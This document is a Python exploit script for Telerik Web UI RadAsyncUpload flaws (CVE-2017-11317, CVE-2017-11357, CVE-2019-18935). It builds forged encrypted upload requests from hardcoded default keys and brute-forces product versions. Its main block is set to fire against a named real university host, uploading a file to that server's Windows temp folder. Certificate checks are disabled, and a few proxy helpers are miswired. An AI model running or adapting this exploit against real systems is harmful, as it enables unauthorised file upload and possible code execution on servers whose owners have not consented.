#!/usr/bin/python3

# Author: Paul Taylor / @bao7uo
# https://github.com/bao7uo/RAU_crypto/blob/master/RAU_crypto.py

# RAU crypto - Exploiting CVE-2017-11317, CVE-2017-11357, CVE-2019-18935

# Telerik Web UI for ASP.NET AJAX
# RadAsyncUpload hardcoded keys / insecure direct object reference
# Arbitrary file upload, .NET Deserialisation

# Telerik mitigated in June 2017 by removing default keys in
# versions R2 2017 SP1 (2017.2.621) and providing the ability to disable the
# RadAsyncUpload feature in R2 2017 SP2 (2017.2.711)

# .NET deserialisation was discovered by @mwulftange and mitigated in R3 2019 SP1 by adding whitelisting feature

# Updated exploit works on later versions where custom keys have been set if you
# have access to them, e.g. readable web.config
# not compatible when machine key protect encryption is used

# https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/unrestricted-file-upload
# https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/insecure-direct-object-reference
# http://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security

# http://target/Telerik.Web.UI.WebResource.axd?type=rau

import sys
import base64
import json
import re
import requests
import os
from Crypto.Cipher import AES
from Crypto.Hash import HMAC
from Crypto.Hash import SHA256
from Crypto.Hash import SHA1
from struct import Struct
from operator import xor
from itertools import starmap

import binascii

from requests.packages.urllib3.exceptions import InsecureRequestWarning

#   ******************************************
#   ******************************************

# ADVANCED_SETTINGS section 1 of 2
# Warning, the below prevents certificate warnings,
# and verify = False (CERT_VERIFY prevents them being verified

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

CERT_VERIFY = False

#   ******************************************
#   ******************************************

class PBKDF:

    def sha1(v):
        hl = SHA1.new()
        hl.update(v)
        return hl.digest()

    def derive1(password, salt):
        hash = (password + salt).encode()
        for i in range(0, 99):
            hash = PBKDF.sha1(hash)

        result = PBKDF.sha1(hash)
        i = 1
        while len(result) < 48:
            result += PBKDF.sha1(str(i).encode() + hash)
            i += 1

        return result

    def hmacsha1(v):
        hl = PBKDF.mac.copy()
        hl.update(v)
        return bytearray(hl.digest())


    def derive2(password, salt):
        # Credit: @mitsuhiko https://github.com/mitsuhiko/python-pbkdf2/blob/master/pbkdf2.py
        result_length = 48
        PBKDF.mac = HMAC.new(bytes(password.encode()), None, SHA1.new())
        result = []
        for b in range(1, -(-result_length // PBKDF.mac.digest_size) + 1):
            rv = u = PBKDF.hmacsha1(salt.encode() + Struct('>i').pack(b))
            for i in range(999):
                u = PBKDF.hmacsha1(u)
                rv = starmap(xor, zip(rv, u))
            result.extend(rv)
        result = b''.join(map(bytes, [result]))[:result_length]
        return result

    def derive(type, password,salt = ''.join(chr(i) for i in [58, 84, 91, 25, 10, 34, 29, 68, 60, 88, 44, 51, 1])):
        if type == 1:
            result = PBKDF.derive1(password, salt)
            result = result[0:32] + result[8:16] + result[40:48] # Bizarre hack
        elif type == 2:
            result = PBKDF.derive2(password, salt)

        return result[0:32], result[32:]


class RAUCipher:


#   ******************************************
#   ******************************************

    # ADVANCED_SETTINGS section 2 of 2

    # Default settings are for vulnerable versions before 2017 patches with default keys

    T_Upload_ConfigurationHashKey = \
        "PrivateKeyForHashOfUploadConfiguration" # Default hardcoded key for versions before 2017 patches
    HASHKEY = T_Upload_ConfigurationHashKey # or your custom hashkey

    T_AsyncUpload_ConfigurationEncryptionKey = \
        "PrivateKeyForEncryptionOfRadAsyncUploadConfiguration" # Default hardcoded key for versions before 2017 patches
    PASSWORD = T_AsyncUpload_ConfigurationEncryptionKey # or your custom password

    # Latest tested version working with this setting: 2018.1.117
    # Probably working up to and including 2018.3.910
    PBKDF_ALGORITHM = 1

    # Earliest tested version working with this setting: 2019.2.514
    # Probably introduced 2019.1.115
#    PBKDF_ALGORITHM = 2

#   ******************************************
#   ******************************************

    key, iv = PBKDF.derive(PBKDF_ALGORITHM, PASSWORD)

#    print(binascii.hexlify(key).decode().upper())
#    print(binascii.hexlify(iv).decode().upper())

    def encrypt(plaintext):
        encoded = ""
        for i in plaintext:
            encoded = encoded + i + "\x00"
        plaintext = encoded + (
                                chr(16 - (len(encoded) % 16)) *
                                (16 - (len(encoded) % 16))
                            )
        cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)
        return base64.b64encode(cipher.encrypt(plaintext.encode())).decode()


    def decrypt(ciphertext):
        ciphertext = base64.b64decode(ciphertext)
        cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)
        unpad = lambda s: s[0:-ord(chr(s[-1]))]
        return unpad(cipher.decrypt(ciphertext)).decode()[0::2]


    def addHmac(string, Version):

        isHmacVersion = False

        # "Encrypt-then-MAC" feature introduced in R1 2017
        # Required for >= "2017.1.118" (e.g. "2017.1.118", "2017.1.228", "2017.2.503" etc.)

        if int(Version[:4]) >= 2017:
            isHmacVersion = True

        hmac = HMAC.new(
            bytes(RAUCipher.HASHKEY.encode()),
            string.encode(),
            SHA256.new()
            )

        hmac = base64.b64encode(hmac.digest()).decode()
        return string + hmac if isHmacVersion else string


def getProxy(proxy):
    return { "http" : proxy, "https" : proxy }


def rauPostData_enc(partA, partB):
    data = "-----------------------------62616f37756f2f\r\n"
    data += "Content-Disposition: form-data; name=\"rauPostData\"\r\n"
    data += "\r\n"
    data += RAUCipher.encrypt(partA) + "&" + RAUCipher.encrypt(partB) + "\r\n"
    return  data


def rauPostData_prep(TempTargetFolder, Version):
    TargetFolder = RAUCipher.addHmac(
                                RAUCipher.encrypt(""),
                                Version
                                )
    TempTargetFolder = RAUCipher.addHmac(
                                RAUCipher.encrypt(TempTargetFolder),
                                Version
                                )

    partA = \
        '{"TargetFolder":"' + TargetFolder + '","TempTargetFolder":"' + \
        TempTargetFolder + \
        '","MaxFileSize":0,"TimeToLive":{"Ticks":1440000000000,"Days":0,"Hours":40,"Minutes":0,"Seconds":0,"Milliseconds":0,"TotalDays":1.6666666666666666,"TotalHours":40,"TotalMinutes":2400,"TotalSeconds":144000,"TotalMilliseconds":144000000},"UseApplicationPoolImpersonation":false}'

    partB = \
        "Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=" + \
        Version + ", Culture=neutral, PublicKeyToken=121fae78165ba3d4"
    
    return rauPostData_enc(partA, partB)


def payload(TempTargetFolder, Version, payload_filename):
    #sys.stderr.write("Local file path: " + payload_filename + "\n")
    payload_filebasename = os.path.basename(payload_filename)
    #sys.stderr.write("Destination file name: " + payload_filebasename + "\n")
    #sys.stderr.write("Destination path: " + TempTargetFolder + "\n")
    #sys.stderr.write("Version: " + Version + "\n")
    #sys.stderr.write("Preparing payload... \n")
    #payload_file = open(payload_filename, "rb")
    payload_file_data = b"test"
    #payload_file.close()

    data1 = rauPostData_prep(TempTargetFolder, Version)
    data1 += "-----------------------------62616f37756f2f\r\n"
    data1 += "Content-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\n"
    data1 += "Content-Type: application/octet-stream\r\n"
    data1 += "\r\n"

    data2 = "\r\n"
    data2 += "-----------------------------62616f37756f2f\r\n"
    data2 += "Content-Disposition: form-data; name=\"fileName\"\r\n"
    data2 += "\r\n"
    data2 += "RAU_crypto.bypass\r\n"
    data2 += "-----------------------------62616f37756f2f\r\n"
    data2 += "Content-Disposition: form-data; name=\"contentType\"\r\n"
    data2 += "\r\n"
    data2 += "text/html\r\n"
    data2 += "-----------------------------62616f37756f2f\r\n"
    data2 += "Content-Disposition: form-data; name=\"lastModifiedDate\"\r\n"
    data2 += "\r\n"
    data2 += "2019-01-02T03:04:05.067Z\r\n"
    data2 += "-----------------------------62616f37756f2f\r\n"
    data2 += "Content-Disposition: form-data; name=\"metadata\"\r\n"
    data2 += "\r\n"
    data2 += "{\"TotalChunks\":1,\"ChunkIndex\":0,\"TotalFileSize\":1,\"UploadID\":\"" + payload_filebasename + "\"}\r\n"
    data2 += "-----------------------------62616f37756f2f--\r\n"
    data2 += "\r\n"

    # Concatenate text fields with binary data.
    data = bytes(data1, 'utf8') + payload_file_data + bytes(data2, 'utf8')
    #sys.stderr.write("Payload prep done\n")
    return data

def upload(data, url, proxy = False):

    global CERT_VERIFY

    #sys.stderr.write("Preparing to send request to " + url + "\n")
    session = requests.Session()
    request = requests.Request(
                        "POST",
                        url,
                        data=data
                        )
    request = request.prepare()
    request.headers["Content-Type"] = \
        "multipart/form-data; " +\
        "boundary=---------------------------62616f37756f2f"
    response = session.send(request, verify=CERT_VERIFY, proxies = getProxy(proxy))
    #sys.stderr.write("Request done\n")
    return response.text


def decode_rauPostData(rauPostData):
    rauPostData = rauPostData.split("&")
    rauJSON = RAUCipher.decrypt(rauPostData[0])
    decoded = "\nJSON: " + rauJSON + "\n"
    TempTargetFolder = json.loads(rauJSON)["TempTargetFolder"]
    decoded = decoded + "\nTempTargetFolder = " + \
                        RAUCipher.decrypt(TempTargetFolder) + "\n"
    rauVersion = RAUCipher.decrypt(rauPostData[1])
    decoded = decoded + "\nVersion: " + rauVersion + "\n"
    return decoded


def mode_decrypt():
    # decrypt ciphertext
    ciphertext = sys.argv[2]
    print("\n" + RAUCipher.decrypt(ciphertext) + "\n")


def mode_Decrypt_rauPostData():
    # decrypt rauPostData
    rauPostData = sys.argv[2]
    print(decode_rauPostData(rauPostData))


def mode_encrypt():
    # encrypt plaintext
    plaintext = sys.argv[2]
    print("\n" + RAUCipher.encrypt(plaintext) + "\n")


def mode_Encrypt_rauPostData():
    # encrypt rauPostData based on TempTargetFolder and Version
    TempTargetFolder = sys.argv[2]
    Version = sys.argv[3]
    print(
        "rauPostData: " +
        rauPostData_prep(TempTargetFolder, Version) +
        "\n"
    )


def custom_payload(partA, partB):
    return  rauPostData_enc(partA, partB) \
    + "-----------------------------62616f37756f2f\r\n" \
    + "Content-Disposition: filename=\"bao7uo\"\r\n" \
    + "\r\n" \
    + "-----------------------------62616f37756f2f--\r\n"


def mode_encrypt_custom_Payload():
    print(
        "Custom Payload: \n\n" + custom_payload(sys.argv[2], sys.argv[3])
    )


def mode_send_custom_Payload(proxy = False):
    print(upload(custom_payload(sys.argv[2], sys.argv[3]), sys.argv[4], proxy))    


def mode_send_custom_Payload_proxy(): 
    mode_send_custom_Payload(sys.argv[5])


def mode_payload(folder_temp, version, url):
    # generate a payload based on TempTargetFolder, Version and payload file
    TempTargetFolder = folder_temp
    Version = version
    payload_filename = url
    print("Content-Type: multipart/form-data; boundary=---------------------------62616f37756f2f")
    return payload(TempTargetFolder, Version, payload_filename)


def mode_Post_Proxy():
    mode_Post(sys.argv[6])


def mode_Post(folder_temp, version, filename, url):
    # generate and upload a payload based on
    # TempTargetFolder, Version, payload file and url
    TempTargetFolder = folder_temp
    Version = version
    payload_filename = filename
    url = url

    return upload(payload(TempTargetFolder, Version, payload_filename), url)


def mode_help():
    print(
        "Usage:\n" +
        "\n" +
        "Decrypt a ciphertext:               -d ciphertext\n" +
        "Decrypt rauPostData:                -D rauPostData\n" +
        "Encrypt a plaintext:                -e plaintext\n\n" +

        "Generate file upload rauPostData:   -E c:\\\\destination\\\\folder Version\n" +
        "Generate all file upload POST data: -p c:\\\\destination\\\\folder Version ../local/filename\n" +
        "Upload file:                        -P c:\\\\destination\\\\folder Version c:\\\\local\\\\filename url [proxy]\n\n" +

        "Generate custom payload POST data : -c partA partB\n" +
        "Send custom payload:                -C partA partB url [proxy]\n\n" +

        "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau\n"
        "Example Version:           2016.2.504\n"
        "Example optional proxy:    127.0.0.1:8080\n"
        "\n" +
        "N.B. Advanced settings e.g. custom keys or PBKDB algorithm can be found by searching source code for: ADVANCED_SETTINGS\n"
    )


def check_cve_rau(url):
    version = '2007.1423 2007.1521 2007.1626 2007.2918 2007.21010 2007.21107 2007.31218 2007.31314 2007.31425 2008.1415 2008.1515 2008.1619 2008.2723 2008.2826 2008.21001 2008.31105 2008.31125 2008.31314 2009.1311 2009.1402 2009.1527 2009.2701 2009.2826 2009.31103 2009.31208 2009.31314 2010.1309 2010.1415 2010.1519 2010.2713 2010.2826 2010.2929 2010.31109 2010.31215 2010.31317 2011.1315 2011.1413 2011.1519 2011.2712 2011.2915 2011.31115 2011.3.1305 2012.1.215 2012.1.411 2012.2.607 2012.2.724 2012.2.912 2012.3.1016 2012.3.1205 2012.3.1308 2013.1.220 2013.1.403 2013.1.417 2013.2.611 2013.2.717 2013.3.1015 2013.3.1114 2013.3.1324 2014.1.225 2014.1.403 2014.2.618 2014.2.724 2014.3.1024 2015.1.204 2015.1.225 2015.2.604 2015.2.623 2015.2.729 2015.2.826 2015.3.930 2015.3.1111 2016.1.113 2016.1.225 2016.2.504 2016.2.607 2016.3.914 2016.3.1018 2016.3.1027 2017.1.118 2017.1.228 2017.2.503 2017.2.621 2017.2.711 2017.3.913 2020.3.1021 2020.3.915 2020.2.617 2020.2.512 2020.1.219 2020.1.114 2019.3.1023 2019.3.917 2019.2.514 2019.1.215 2019.1.115 2018.3.910 2018.2.710 2018.2.516 2018.1.117'
    for ver in version.split(' '):
        data = mode_Post('C:\\Windows\\Temp', ver, 'test.txt', url + '/Telerik.Web.UI.WebResource.axd?type=rau')
        if 'fileInfo' in data:
            return ver, data
    return False, None

if __name__ == "__main__":

    sys.stderr.write("\nRAU_crypto by Paul Taylor / @bao7uo \n")
    check_cve_rau('http://ttnn.mta.edu.vn')

